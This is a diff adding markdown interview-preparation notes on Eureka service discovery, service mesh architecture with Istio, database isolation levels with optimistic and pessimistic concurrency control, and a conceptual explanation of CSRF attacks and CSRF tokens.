+    - Alternatively, integrate with **`Spring Cloud Load Balancer`** to avoid writing custom load balancing logic.
+    - Once an instance is chosen, its URI is used in the `RestTemplate` call, so the URL is no longer hardcoded.
+
+  - **New way (with Service Discovery, using `Feign Client` or `Rest Client`)**:
+    - **Load balancing is handled automatically by the framework**.
+    - Requires adding a **load balancer dependency** to the project.
+    - **Old `Feign Client`**: Required specifying the `url` (host and port) within the `@FeignClient` annotation or `application.properties`.
+    - **New `Feign Client` with Service Discovery**: Only requires the **`name`** of the target application (e.g., `@FeignClient(name="product-service")`).
+      - The framework internally uses `DiscoveryClient` to fetch instances and applies load balancing to pick an instance, then invokes the API. This simplifies the client-side code significantly as URLs are not hardcoded.
+
+### Source 8 (Continued) & 9 Notes
+
+- **Interview Questions about Eureka**:
+
+  - **How does Eureka server know whether a client is up or down?**
+    1.  **Client Deregistration Request**:
+        - When a client application is **gracefully shut down**, the Eureka client sends a deregistration request to the Eureka server.
+        - The server then marks the client's status as `down`.
+        - Logs on the client show "un-registering application with Eureka with status down", and server logs show "received registered instance with status down".
+    2.  **Client Heartbeat**:
+        - If a client shuts down **without sending a deregistration request** (e.g., due to a network issue or crash), the Eureka server detects its unavailability through **periodic heartbeats**.
+        - Every client **periodically sends heartbeats to the Eureka server**.
+        - The Eureka server waits for a heartbeat for a **configured interval**.
+        - If **no heartbeat is received within that time interval**, the server removes the client instance from its registry, considering it `dead`.
+
+### Source 9 (Continued) & 10 Notes
+
+- **Client Configuration for Heartbeat (in `application.properties` of the client, e.g., product service)**:
+
+  - `eureka.instance.lease-renewal-interval-in-seconds`:
+    - Defines **how often (in seconds) the client sends a heartbeat** to the server.
+    - Default is **30 seconds**. Example set to 60 seconds.
+  - `eureka.instance.lease-expiration-duration-in-seconds`:
+    - Defines the **maximum time (in seconds) the server will wait for a heartbeat** from the client.
+    - If no heartbeat is received within this duration, the server considers the client unavailable and can remove it.
+    - Default is **90 seconds**. Example set to 5 seconds for testing.
+    - **Important**: This duration is generally **greater than** the `lease-renewal-interval-in-seconds`.
+
+- **Server Configuration for Eviction (in `application.properties` of the Eureka server)**:
+  - `eureka.server.enable-self-preservation=false`:
+    - **Default is `true`**, which means the server **does not remove instances** from its registry even if heartbeats are missed (this is "self-preservation").
+    - Setting this to `false` **allows the server to remove instances** for which heartbeats are not received. This is essential for accurate service discovery in a dynamic environment.
+  - `eureka.server.eviction-interval-timer-in-seconds`:
+    - Defines **how often (in seconds) the Eureka server checks for and removes dead instances** from its registry.
+    - Example set to 6 seconds.
+  - **Demonstration**: With `lease-expiration-duration-in-seconds` set to 5s and `eviction-interval-timer-in-seconds` to 6s, a client (e.g., product service) will be removed from the Eureka dashboard shortly after the 5-second expiry if it stops sending heartbeats.
+
+### Source 11 Notes
+
+- **How does Eureka server store data?**
+  - **In-Memory Only**: Eureka server stores all data **in memory**.
+  - **No Database Persistence**: There is **no database persistence** for the registry data.
+  - **Data Structure**: It uses a **`Map<String, LeaseInstanceInfo>`**.
+  - **Key**: The key for each instance is `app_name/instance_ID`.
+    - An `instance_ID` is uniquely generated from the **IP address, port number, and application name**.
+  - **Value**: The value (`LeaseInstanceInfo`) contains detailed information about the instance, such as:
+    - Application name (`app name`).
+    - IP address.
+    - Hostname.
+    - Port.
+    - Status (`up` or `down`).
+    - Last renewal time (`last renewed`).
+    - Lease duration.
+
+### Source 12 Notes
+
+- **What if Eureka server itself goes down? Is it a Single Point of Failure (SPOF)?**
+
+  - If a **single Eureka server goes down**, all its **in-memory data is lost**.
+  - In this scenario, if an `order service` tries to call a `product service`, it needs to query the Eureka server, which would be unavailable.
+  - Therefore, a **single Eureka server _is_ a Single Point of Failure** in an application.
+
+- **Solution: Eureka Server Cluster**:
+
+  - To prevent SPOF, a **Eureka server cluster** is typically used.
+  - Generally, **three Eureka server nodes** are deployed.
+  - These nodes run on **different machines or containers** with distinct IP addresses and port numbers.
+  - **Each Eureka server in the cluster acts as a client to the other servers**:
+    - They **register themselves** with other servers in the cluster.
+    - They **fetch registries** from other servers to replicate and synchronize changes.
+
+- **Configuration for a Eureka Server in a Cluster (Example for Server 1)**:
+  - In `application.properties`:
+    - `spring.application.name`: (e.g., `eureka-server-1`).
+    - `server.port`: (e.g., `8761`).
+    - `eureka.instance.hostname`: The hostname of the server.
+    - **`eureka.client.register-with-eureka=true`**: Set to `true` because this server also needs to register with other servers in the cluster.
+    - **`eureka.client.fetch-registry=true`**: Set to `true` because this server needs to fetch registry details from other servers to stay synchronized.
+    - **`eureka.client.service-url.defaultZone`**: This crucial property points to the URLs of the **other Eureka servers in the cluster**.
+      - Example for Server 1: `http://server2:8762/eureka,http://server3:8763/eureka`.
+      - Similarly, Server 2 would list Server 1 and Server 3, and Server 3 would list Server 1 and Server 2.
+  - This setup ensures that all servers in the cluster have their internal maps (containing instance details) synchronized.
+
+### Source 13 (Continued) & 14 Notes
+
+- **Consistency in Eureka Cluster**:
+
+  - The synchronization among Eureka servers provides **eventual consistency**.
+  - This means that new entries or updates (e.g., an instance detail) will eventually be propagated to all servers in the cluster.
+  - However, there might be a **slight delay** in synchronization. A client might query a server that hasn't yet received the latest updates, potentially leading to stale data, but retrying might eventually get the correct data.
+
+- **Client Configuration for a Eureka Cluster**:
+
+  - In the client's `application.properties` (`eureka.client.service-url.defaultZone`), you should list **all the Eureka server URLs in the cluster**.
+  - Example: `http://server1:8761/eureka,http://server2:8762/eureka,http://server3:8763/eureka`.
+  - This ensures that if one Eureka server goes down, the client can still communicate with another available server in the cluster, **eliminating the single point of failure** for client availability.
+
+- **Does Service Discovery (Eureka) cause latency issues (Order Service -> Eureka Server -> Product Service)?**
+
+  - **No, it does not cause latency for every request**.
+  - **Local Client Cache**: At **application startup**, the client (e.g., `order service`) fetches the **entire registry** from the Eureka server.
+  - This registry information is then stored in the client's **local cache**.
+  - **Future calls**: All subsequent calls to discover instances use this **local cache copy**. The Eureka server is **not called for every request**.
+
+- **Updating the Local Cache (Preventing Stale Data)**:
+  - The local cache copy on the client might become stale if instances change status (e.g., go down, new instances added).
+  - **Configuration for Cache Refresh**: The `eureka.client.registry-fetch-interval-seconds` property determines **how often (in seconds) the client refreshes its local cache** copy from the Eureka server.
+  - **Trade-off in `registry-fetch-interval-seconds`**:
+    - **Too small (e.g., 1 second)**: Leads to **too many refresh calls** to the Eureka server, which can be inefficient and put a load on the server.
+    - **Too large (e.g., 10,000 seconds)**: Increases the **risk of operating with stale data**. The client's cache might show an instance as `up` when it's actually `down`, leading to failed calls.
+  - **Optimal Setting**: A **proper balance** must be found for this interval to ensure the cache is updated frequently enough to be fresh, without causing excessive refreshes.
+
+### Source 15 Notes
+
+- Service Discovery, particularly Eureka, is **widely used in the industry**.
+- Other tools like **Console** also provide similar service discovery functionalities.
+
+Here are the notes on microservices communication and service mesh, prepared line-by-line from the provided YouTube transcript, structured for an interview context:
+
+---
+
+### **Topic: How Microservices Communicate with Each Other (Without Service Mesh)**
+
+When microservice A needs to communicate with microservice B, several critical capabilities are required. Without a service mesh, these capabilities would typically need to be built into each microservice or managed separately.
+
+- **1. Service Discovery Capability**
+
+  - **Requirement:** Microservice A needs to know the **location (IP address and port number)** of microservice B to call it.
+  - **Process:** Microservice A queries a **service discovery** component.
+  - **Possible Scenarios for Service Discovery Output:**
+    - **Scenario 1:** Service discovery returns the addresses (URL and port) of **all instances** of microservice B.
+    - **Scenario 2:** Service discovery returns the address of the **application load balancer** for microservice B itself.
+  - **Conclusion:** Regardless of the scenario, **service discovery** is the first essential capability.
+
+- **2. Load Balancing Capability (Client-Side)**
+
+  - **Requirement:** If service discovery returns all instances of microservice B (Scenario 1 above), microservice A needs to decide _which_ instance to pick.
+  - **Implementation:** This necessitates **client-side load balancing capability** within microservice A. Microservice A would then fill in the chosen instance's URL and port number to invoke microservice B.
+  - **Alternative (Scenario 2):** If service discovery returns the address of microservice B's application load balancer, microservice A can directly invoke that load balancer. However, this introduces an **extra hop or network call**, potentially increasing latency, and is therefore less frequently used.
+  - **Summary:** After service discovery, client-side load balancing is the second crucial component.
+
+- **3. Authorization and Authentication Capability**
+
+  - **Requirement:** Even for internal company components like microservice A and B, **authorization and authentication** are needed.
+  - **Authorization:** Checks if microservice A is **allowed to invoke a specific API** of microservice B. This box is typically placed on the microservice B side to authorize requests before access.
+  - **Authentication:** Microservice B needs to **authenticate** that the request truly originates from microservice A and not from an unauthorized source.
+  - **Summary:** Microservices need both authentication and authorization.
+
+- **4. Circuit Breaker Capability**
+
+  - **Purpose:** To prevent cascading failures when a downstream service is unresponsive or failing.
+  - **Mechanism:** If microservice A calls microservice B repeatedly (e.g., 10 times) and all requests fail, a circuit breaker can be configured to **"break the circuit"**.
+  - **Action:** For a defined period (e.g., 1 minute), any subsequent attempt by microservice A to call microservice B will **fail immediately** without making a network call, preventing resource exhaustion.
+  - **Recovery:** After the specified period, the circuit "opens" again, allowing calls to resume.
+  - **Example:** In Spring Boot, **Hystrix** provides circuit breaker capability.
+  - **Summary:** Circuit breaker is essential for resilience.
+
+- **5. Retry Capability**
+
+  - **Purpose:** To handle **intermittent issues** or transient failures.
+  - **Mechanism:** If microservice A's initial invocation of microservice B fails, retrying the request might succeed.
+  - **Error Types:**
+    - **4xx errors (e.g., 400 Bad Request):** These are typically **validation errors and are NOT retryable** as they will always fail.
+    - **5xx errors (e.g., 500 Internal Server Error):** These are often **internal errors and ARE generally retryable**, as they could be temporary issues.
+  - **Requirement:** The ability to build and manage this retry logic is needed.
+
+- **6. Deployment Strategy Support**
+
+  - **Requirement:** The client-side load balancer capability needs to support different deployment strategies, such as Canary deployments.
+  - **Canary Deployment Example:**
+    - **Scenario:** Deploying a new manifest (new version) of microservice B while the old manifest is still running.
+    - **Traffic Distribution:** Initially, a small percentage of traffic (e.g., 10%) is directed to the new manifest instances, while the majority (e.g., 90%) goes to the old instances.
+    - **Validation:** This allows for **validating the new manifest** with real traffic.
+    - **Gradual Rollout:** If successful, the traffic percentage to the new manifest is gradually increased (e.g., 20%, 30%, 40%) until 100% of traffic goes to the new instances and old instances are decommissioned.
+  - **Summary:** Deployment strategy support needs to be built into the client-side load balancer.
+
+- **7. Telemetry Capability**
+  - **Purpose:** To collect data for **analysis and monitoring** of microservices.
+  - **Data Collected:**
+    - **Traffic volume:** How many requests an API receives per day, minute, hour (e.g., `/user/API/payment` getting 50k traffic per day).
+    - **Latency:** The time taken for each API call (e.g., 1 second, 2 seconds).
+    - **Error rates:** Tracking success and failure calls.
+    - **Logs:** Collecting samples and detailed logs.
+  - **Mechanism:** Microservice B must record all incoming calls, whether success or failure, along with latency, error rates, and traffic details.
+  - **Benefit:** This data is crucial for creating **observability dashboards** to monitor metrics, latency, etc..
+  - **Summary:** Telemetry is vital for understanding and maintaining the health of microservices.
+
+---
+
+### **Topic: Service Mesh and its Architecture**
+
+A service mesh is a dedicated infrastructure layer that handles inter-service communication, offloading the complexities mentioned above from individual microservices.
+
+- **Kubernetes Context:** In Kubernetes, each microservice instance typically runs inside a **Pod**. Multiple Pods can host instances of the same microservice.
+
+- **Core Component: Sidecar Proxy (Data Plane)**
+
+  - **Deployment:** For each microservice instance (Pod), a **sidecar proxy** is added into the **same Pod**. If a microservice has five instances, each of the five Pods will have its own sidecar proxy.
+  - **Interception:** The sidecar proxy **intercepts every request** that goes _out of_ the microservice instance and every request that comes _into_ the microservice instance. This means the microservice itself doesn't need to be modified or integrate with the proxy; it works **out of the box** in Kubernetes.
+  - **Capabilities:** All the capabilities discussed earlier (load balancing, circuit breaker, retry, deployment strategy, telemetry) are provided by the **sidecar proxy**.
+  - **Communication:** Sidecar proxies can **directly talk to each other**. This layer is known as the **Data Plane**.
+
+- **Management Component: Control Plane**
+
+  - **Purpose:** The control plane manages and configures all the sidecar proxies in the data plane.
+  - **Interaction:** The exchange of information between the control plane and data plane (sidecar proxies) **does not happen in real-time** with every request. Instead, data is pushed to the sidecar whenever there is a **configuration change**.
+  - **Components of the Control Plane:**
+    - **Configuration Manager**
+      - **Function:** Reads configurations from the user (e.g., YAML files or UI).
+      - **Validation:** Validates these configurations to ensure they are in a proper and understandable format.
+      - **Example Configuration:** Users can enable/disable circuit breaker capability (e.g., `true`/`false`), set break duration (e.g., 1 minute), or configure retry attempts (e.g., 3 times).
+    - **Traffic Controller**
+      - **Function:** Takes the validated configuration from the Configuration Manager and **pushes this information to the sidecar proxies**.
+      - **Action:** The sidecar proxies then use these configurations to apply the desired capabilities (e.g., breaking the circuit after subsequent failures).
+    - **Security Manager**
+      - **Function:** Provides configurations related to **authorization and authentication** to the sidecar proxies.
+      - **Encryption:** Ensures that communication between two sidecar proxies is **properly encrypted**.
+      - **Key Exchange (TLS Certificates):** Helps sidecar proxies generate their private keys and share their public keys (via TLS certificates) for secure communication. A signed TLS certificate provides **identity** for a microservice.
+      - **Decryption & Authorization:** The certificate with the public key allows the receiving proxy to decrypt encrypted requests and verify the sender's identity. The Security Manager also configures authorization rules (e.g., if microservice A has permission to access microservice B's API).
+    - **Telemetry Component**
+      - **Function:** Collects data (metrics) from sidecar proxies.
+      - **Methods:**
+        - **Pull method (more common):** Telemetry time-to-time checks with sidecar proxies and collects data.
+        - **Push method:** Sidecar proxies push metrics to the Telemetry component.
+      - **Benefit:** The collected data can be used to create **observability dashboards** to monitor metrics like traffic, latency, and error rates.
+
+- **Simplification for Microservices**
+
+  - **No Direct IP/Port Needed:** With a service mesh, microservice A no longer needs to know the URL and port number of microservice B.
+  - **Application Name Only:** Microservice A simply states that it wants to communicate with **"microservice B" (its application name)**.
+  - **Sidecar's Role:** The sidecar proxy, having received service discovery configuration from the control plane, uses this data to find the best instance of microservice B, forwards the request, and intercepts it on the other side.
+
+- **Istio Example (Popular Service Mesh)**
+  - **Envoy:** The sidecar proxy in Istio is called **Envoy**.
+  - **Galley:** The configuration manager in Istio is known as **Galley**.
+  - **Pilot:** The traffic controller in Istio is known as **Pilot**.
+  - **Citadel:** The security manager in Istio is known as **Citadel**.
+
+---
+
+Here are detailed notes from the provided YouTube transcript on Concurrency Control in Distributed Systems, structured for an interview context:
+
+---
+
+### **1. Introduction to Concurrency Control & The Problem Statement**
+
+- **Interview Relevance**: Concurrency control is a **very important interview question** asked in both low-level and high-level design interviews. For low-level design, it often comes as a follow-up question when discussing scenarios like booking systems (e.g., BookMyShow, parking lots). In high-level design, it might be a direct question like "explain distributed concurrency control".
+- **The Problem (Concurrent Access to Shared Resources)**:
+
+  - **Scenario**: Imagine multiple concurrent requests (e.g., three users) trying to book the **same movie theater seat**.
+  - **Critical Section**: This shared seat is an example of a **shared resource**. The piece of code logic that accesses this shared resource is called the **critical section**.
+  - **Issue without Control**:
+    - All three requests simultaneously **read the seat's status as 'free'**.
+    - They all proceed to **change its status to 'booked'** and update the database.
+    - Result: All three users **receive 'success'**, leading to the **same seat being allocated to multiple users** – an inconsistent state.
+  - **Core Problem**: This illustrates the fundamental problem of **multiple requests trying to access one common or shared resource**, which necessitates handling concurrency.
+
+- **Limitations of `synchronized` Block in Distributed Systems**:
+  - **Local Concurrency**: In a single process with **multiple threads**, a `synchronized` block on the critical section effectively puts an **internal lock**, ensuring only one thread can enter at a time. For example, if user 1 enters, books the seat, and exits, user 2 will find the seat already booked.
+  - **Distributed System Challenge**: In a distributed system, your microservice might be running on **multiple machines (Machine 1, Machine 2, Machine 3)**, each as a separate process.
+    - Requests from different users (User 1, User 2, User 3) might hit different instances of the service via a load balancer.
+    - Even if all requests reach their respective service instances and their critical sections concurrently, the `synchronized` keyword **cannot help** because each instance is a **separate process**.
+  - **Conclusion**: `synchronized` works for intra-process concurrency but **not for distributed concurrency control**. Therefore, we need something called "distributed concurrency control".
+
+---
+
+### **2. Essential Prerequisites for Distributed Concurrency Control**
+
+Before diving into optimistic and pessimistic concurrency control, it's crucial to understand three foundational concepts.
+
+#### **2.1. Usage of Transaction**
+
+- **Purpose**: Transactions help achieve **integrity** and **avoid inconsistency** in the database.
+- **Concept**: A transaction groups multiple database operations (statements) together, treating them as a **single, atomic unit**.
+- **Example (Debit & Credit)**:
+  - **Scenario**: Debit money from account A (e.g., 20 rupees from 100) and credit it to account B (e.g., to 50).
+  - **Steps within Transaction**:
+    1.  Debit 20 rupees from A (A becomes 80). This DB statement succeeds.
+    2.  Credit 20 rupees to B (B should become 70).
+  - **Failure and Rollback**: If step 2 (credit to B) **fails** due to some error:
+    - The transaction will perform a **rollback**.
+    - Rollback reverts **all changes made by _all_ successful DB statements within that transaction** back to their original state at the start of the transaction.
+    - In this case, A would be **reverted from 80 back to 100**, ensuring the database remains in a consistent state.
+  - **Inconsistency without Transaction**: If no transaction is used, and the credit to B fails after the debit from A succeeds, A would remain 80 while B remains 50. This leaves the **database in an inconsistent state** (money debited but not credited).
+  - **Consistent States**:
+    - If both operations succeed: A: 80, B: 70.
+    - If any operation fails: A: 100, B: 50 (original state via rollback).
+  - **Summary**: Transactions ensure that either **all operations succeed, or all are rolled back**, maintaining database consistency.
+
+#### **2.2. Database (DB) Locking**
+
+- **Purpose**: DB locking ensures that **no other transaction updates locked rows**.
+- **Mechanism**: If a lock is placed on a row (e.g., `ID: 10, Status: Free`), it prevents other transactions or queries from changing it.
+- **Types of Locks**:
+  - **1. Shared Locks (S)**:
+    - **Purpose**: Generally used for **reading** (`read lock`).
+    - **Compatibility**:
+      - **Multiple transactions can simultaneously acquire shared locks** on the **same row**.
+      - All transactions holding a shared lock can **read** the data.
+      - However, if a row has a shared lock, **no other transaction can acquire an _exclusive lock_ (for writing)** on that row. The shared lock must be removed first.
+  - **2. Exclusive Locks (X)**:
+    - **Purpose**: Generally used for **writing/updating** (`write lock`).
+    - **Compatibility**:
+      - **Only one transaction can acquire an exclusive lock** on a row at any given time.
+      - If a transaction holds an exclusive lock, **no other transaction can acquire _any_ other lock (neither shared for reading nor exclusive for writing)** on that row.
+      - This means other transactions **cannot even read** the row.
+
+#### **2.3. Isolation Level**
+
+- **Context**: Isolation is the 'I' in **ACID properties** of a database.
+- **Definition**: Isolation tells us how much **concurrency is allowed** in an application. It makes each transaction **feel like they are working alone and are totally isolated**, even when multiple transactions are running in parallel.
+- **Importance**: Critical for understanding distributed concurrency control and optimistic/pessimistic approaches.
+- **Problems Solved by Isolation Levels**:
+
+  - **1. Dirty Read Problem**:
+    - **Definition**: Occurs when **Transaction A reads data that has been written by Transaction B but _not yet committed_**.
+    - **Scenario**:
+      - DB state: `ID: 1, Status: Free`.
+      - Transaction B updates `ID: 1` to `Status: Booked` but **does not commit** yet.
+      - Transaction A reads `ID: 1` and sees `Status: Booked`.
+      - **Problem**: If Transaction B then **fails and rolls back** its changes, reverting `ID: 1` back to `Status: Free`, Transaction A has read **'dirty' data** that was never actually committed.
+    - **Consequence**: Transaction A might have performed computations based on incorrect, uncommitted data.
+  - **2. Non-Repeatable Read Problem**:
+    - **Definition**: Occurs when a **transaction reads the _same row several times_ and gets _different values_**.
+    - **Scenario**:
+      - Transaction A starts.
+      - Transaction A reads `ID: 1` and sees `Status: Free`.
+      - Another transaction (e.g., Transaction B) **updates `ID: 1` to `Status: Booked` and _commits_ its changes**.
+      - Later, within the _same Transaction A_, it reads `ID: 1` again.
+      - **Problem**: Transaction A now sees `Status: Booked` for the same row it previously read as 'Free', because it's allowed to read committed data from other transactions.
+  - **3. Phantom Read Problem**:
+    - **Definition**: Occurs when a **transaction executes the _same query several times_ and the _number of rows returned is different_**.
+    - **Scenario**:
+      - Transaction A starts.
+      - Transaction A executes a query (e.g., `ID > 0 AND ID < 5`) and gets **two rows** (`ID: 1, ID: 3`).
+      - Another transaction (e.g., Transaction B) **inserts a _new row_ (e.g., `ID: 2`)** that satisfies the same query's criteria, and commits.
+      - Later, within the _same Transaction A_, it executes the _same query again_.
+      - **Problem**: Transaction A now gets **three rows** (`ID: 1, ID: 2, ID: 3`), a 'phantom' row has appeared that wasn't there before.
+
+- **Types of Isolation Levels**:
+
+  - **1. Read Uncommitted (Isolation Level 0)**:
+
+    - **Locking Strategy**: **No locks acquired for read or write** operations.
+    - **Problems**: **All three problems are possible**: Dirty Read, Non-Repeatable Read, Phantom Read.
+      - _Dirty Read Possible_: If one transaction updates a value but doesn't commit, another can read it immediately without any lock.
+      - _Non-Repeatable Read Possible_: No locking means other transactions can change and commit data, causing subsequent reads within the same transaction to yield different values.
+      - _Phantom Read Possible_: New rows can be inserted by other transactions within a query range, appearing in subsequent reads.
+    - **Concurrency**: **Very high**.
+    - **Use Case**: **Very risky**. Generally used **only for read-only scenarios** where slight inconsistency is acceptable. **Not suitable if writing is involved**.
+
+  - **2. Read Committed (Isolation Level 1)**:
+
+    - **Locking Strategy**:
+      - **Read**: Acquires a **shared lock**, but **releases it as soon as the read is done**.
+      - **Write**: Acquires an **exclusive lock** and **keeps it until the end of the transaction** (commit or abort).
+    - **Problems Solved**: **Solves Dirty Read problem**.
+      - _How Dirty Read is Solved_: If a transaction (T2) updates a row, it holds an exclusive lock until it commits. If another transaction (T1) tries to read it, it will attempt to acquire a shared lock, but an exclusive lock prevents shared locks. T1 will have to wait or timeout. Thus, T1 only reads committed data.
+    - **Problems NOT Solved**: **Non-Repeatable Read** and **Phantom Read problems still exist**.
+      - _Non-Repeatable Read Exists_: A transaction (T1) reads a row (gets '11'). It releases its shared lock. Another transaction (T2) can then update the row to a new value (e.g., '12') and commit. When T1 reads the same row again, it will see the new committed value ('12').
+    - **Concurrency**: Slightly lower than Read Uncommitted.
+
+  - **3. Repeatable Read (Isolation Level 2)**:
+
+    - **Locking Strategy**:
+      - **Read**: Acquires a **shared lock** and **keeps it until the end of the transaction**.
+      - **Write**: Acquires an **exclusive lock** and **keeps it until the end of the transaction**.
+    - **Problems Solved**: **Solves Dirty Read and Non-Repeatable Read problems**.
+      - _How Non-Repeatable Read is Solved_: When T1 reads a row, it holds a shared lock until its transaction ends. If T2 tries to update that row, it needs an exclusive lock, which cannot be granted while T1 holds a shared lock. Thus, T2 cannot update the row, and T1 will always read the same value within its transaction.
+    - **Problems NOT Solved**: **Phantom Read problem still exists**.
+    - **Concurrency**: Lower than Read Committed.
+
+  - **4. Serializable (Isolation Level 3)**:
+    - **Locking Strategy**: Same as Repeatable Read (shared/exclusive locks held till end of transaction) **PLUS it applies a "range lock"**.
+    - **Range Lock**: Locks not just the rows that satisfy a query, but also **nearby ranges or potential insertion points**. This prevents other transactions from inserting new rows that would fall within the query's range.
+    - **Problems Solved**: **Solves Dirty Read, Non-Repeatable Read, AND Phantom Read problems**.
+      - _How Phantom Read is Solved_: By locking the entire range of potential rows for a query, no new rows can be inserted into that range by other transactions, preventing phantom reads.
+    - **Concurrency**: The lowest among all levels, as it restricts concurrency the most.
+    - **Configuration**: Isolation level can be set per transaction (e.g., `SET TRANSACTION ISOLATION LEVEL REPEATABLE READ`). If not set, the **default isolation level** of the database (e.g., MySQL's InnoDB default might be Repeatable Read) will be used.
+
+---
+
+### **3. Distributed Concurrency Control: Optimistic vs. Pessimistic**
+
+Now, with the understanding of transactions, DB locking, and isolation levels, we can delve into the main approaches to distributed concurrency control.
+
+#### **3.1. Optimistic Concurrency Control**
+
+- **Core Idea**: Assumes that **conflicts are rare** and proceeds with operations without immediate locking. It **checks for conflicts only _before_ committing changes**.
+- **Concurrency**: Allows for **more concurrency**.
+- **Isolation Level**: Typically uses **Read Committed**.
+- **Mechanism: Versioning**:
+  - **Version Column**: Requires a `version` column for each row in the database. Some DBs (like MySQL) have row versions built-in; for others (like Oracle), you might add a custom column.
+  - **Process**:
+    1.  **Read**: Multiple transactions (e.g., T_A and T_B) can **read the same row concurrently**. They record the **version number** of the row at the time of their read (e.g., `version = 1`). Because Read Committed releases shared locks immediately after reading, multiple reads are possible.
+    2.  **Compute/Modify (Local)**: Each transaction performs its necessary computations and modifications locally, without holding a lock on the DB row.
+    3.  **Update Attempt & Validation**: When a transaction (e.g., T_A) wants to update the row:
+        - It first attempts to acquire an **exclusive lock** (e.g., using `SELECT FOR UPDATE` in some databases, though the transcript implies a more general "put an exclusive lock" concept for the update phase).
+        - It then performs a **version validation**: it checks if the **current version in the database matches the version it read initially**.
+        - **Conflict Scenario**: If T_A read `version = 1` and now the DB has `version = 2` (meaning another transaction, T_B, already updated and committed its changes):
+          - **Validation Fails**: T_A's validation fails.
+          - **Rollback & Retry**: T_A's transaction is **rolled back**, and it is expected to **try again** (re-read the latest version and re-apply its logic). This is the **overhead in case of conflict**.
+        - **No Conflict Scenario**: If T_A read `version = 1` and the DB still has `version = 1`:
+          - **Validation Success**: T_A's validation succeeds.
+          - **Update & Increment Version**: T_A updates the row and **increments the version number** (e.g., from 1 to 2).
+          - **Commit**: T_A commits its transaction, releasing the exclusive lock.
+- **Properties**:
+  - **High Concurrency**: Yes, because locks are not held during the read and computation phases.
+  - **No Deadlock**: Optimistic concurrency control has **no problem of deadlocks**. This is because it doesn't hold locks for long durations or across multiple resources that could create circular dependencies.
+  - **Conflict Resolution**: Conflicts are detected at the **commit/update phase**, leading to **rollbacks and retries** for conflicting transactions.
+- **When to Use**: Popular in scenarios where **conflicts on a single resource are less frequent**.
+
+#### **3.2. Pessimistic Concurrency Control**
+
+- **Core Idea**: Assumes that **conflicts are frequent** and aims to prevent them by **locking resources immediately** upon access.
+- **Concurrency**: Provides **less concurrency** compared to optimistic control.
+- **Isolation Level**: Uses **Repeatable Read or Serializable** isolation levels.
+- **Mechanism**:
+  - **Locks Held Till End**: When a transaction acquires a shared or exclusive lock, it **holds that lock until the end of the transaction** (either commit or abort).
+  - **Sequential Access**: This approach effectively leads to a **sequential processing** of conflicting operations, as transactions must wait for locks to be released.
+- **Properties**:
+  - **Less Concurrency**: Yes, due to long-held locks.
+  - **Deadlock Possible**: **Deadlocks are a significant problem** with pessimistic concurrency control.
+    - **Deadlock Scenario Example**:
+      - T1 wants to `read A` then `write B`.
+      - T2 wants to `read B` then `write A`.
+      - Steps:
+        1.  T1 `reads A`, acquires a **shared lock on A**.
+        2.  T2 `reads B`, acquires a **shared lock on B**.
+        3.  T1 tries to `write B`. It needs an **exclusive lock on B**, but T2 holds a shared lock on B. T1 **waits for T2 to release its lock on B**.
+        4.  T2 tries to `write A`. It needs an **exclusive lock on A**, but T1 holds a shared lock on A. T2 **waits for T1 to release its lock on A**.
+      - Result: Both transactions are **waiting for each other indefinitely**, leading to a **deadlock**.
+    - **Resolution for Deadlocks**: Transactions stuck in deadlock are typically **aborted** (forced to roll back all their changes and release their locks) after a certain timeout period, and might have to restart.
+  - **Long-Running Transactions**: If pessimistic locks are held for long-running transactions (as they are in Repeatable Read and Serializable levels), it can lead to **timeout and rollback** for waiting transactions.
+- **Popular Approach**: **Two-Phase Locking (2PL)** is a very popular protocol for implementing pessimistic concurrency control. (The speaker mentions he'll explain 2PL in a future session).
+
+---
+
+### **4. Conclusion: Choosing the Right Approach**
+
+- **No "Always Best" Opinion**: There is **no single best approach** (optimistic is not always superior).
+- **Decision Criteria**: The choice between optimistic and pessimistic concurrency control depends entirely on the **specific problem you are solving**.
+- **Steps to Decide**:
+  1.  First, **determine the required isolation level** for your application based on its consistency needs (e.g., are dirty reads acceptable? Non-repeatable reads?).
+  2.  Based on the chosen isolation level, you can then decide whether to use optimistic or pessimistic concurrency control.
+      - If high concurrency is needed and conflicts are rare, and `Read Committed` (or below `Repeatable Read`) is acceptable, **optimistic** is often preferred.
+      - If strict consistency is paramount, conflicts are expected, and `Repeatable Read` or `Serializable` isolation is required, then **pessimistic** might be necessary despite its lower concurrency and deadlock risks.
+
+Here are comprehensive notes from the provided sources, structured by topic for interview preparation, ensuring no important points are skipped:
+
+---
+
+### Understanding Common Web Attacks and Protections
+
+The sources discuss several crucial web security topics that are essential for understanding Spring Security and are often asked in interviews. These include CSRF, XSS, CORS, and SQL Injection.
+
+---
+
+### **1. CSRF (Cross-Site Request Forgery)**
+
+**What it is:**
+
+- CSRF is an attack that **tricks a browser into making unwanted requests to a site where the user is already authenticated**.
+- It is **mostly applicable where state and session are managed** (stateful applications), such as when a session ID is stored in a browser's cookie.
+
+**How it happens (Mechanism and Demo Explanation):**
+
+1.  **User Authentication:** The user is already authenticated to a legitimate site (e.g., Gmail, a banking site). This means their browser has a session ID stored in a cookie, maintaining their session.
+2.  **Attacker Tricks User:** An attacker crafts a malicious link or embeds it on a webpage.
+3.  **User Clicks Malicious Link:** The attacker tricks the user into clicking this link (e.g., "click here and this will get resolved" or "transfer $1,000 to attacker").
+4.  **Unwanted Request Initiated:** When the user clicks the malicious link, their browser automatically initiates an unwanted request to the legitimate site on the user's behalf.
+5.  **Session ID Included:** Critically, the user's browser automatically adds the stored session ID (from the cookie) to this unwanted request.
+6.  **Server Grants Access:** Because the request contains a valid session ID, the legitimate server perceives it as a legitimate request from the authenticated user and grants access or performs the action (e.g., transferring money).
+7.  **User Unawareness:** The user remains unaware that their click intended to do something else and initiated an unauthorised action in the background.
+
+**Example Demo Walkthrough:**
+
+- A Spring Boot server is set up requiring all requests to be authenticated and has an endpoint `/transfer` to transfer money.
+- **Step 1: User Authenticates:** A user logs into the server (e.g., `localhost`), and a session ID (e.g., `mme1n`) is returned and stored in the browser's cookie.
+- **Step 2: Malicious Link Received:** The user receives a malicious link via email, WhatsApp, or browsing, which, when clicked, internally calls the `/transfer` API.
+- **Attack Execution:** When the user clicks the link (e.g., "transfer $1,000 to attacker"), the browser makes a request to `/transfer`. The **browser automatically adds the session ID** (`mme1n`) to this request.
+- **Result:** The server, seeing a valid session ID, processes the transfer request, even though the user was tricked.
+
+**How to Protect:**
+
+- The primary protection method is by using a **CSRF token**.
+- **Mechanism:** Apart from the session ID in the cookie, the server also returns a unique CSRF token in the response.
+- **Legitimacy Check:** This token is known only to the authenticated, legitimate source (the actual website/form).
+- **Request Requirement:** Only legitimate forms or websites will append this CSRF token to their requests.
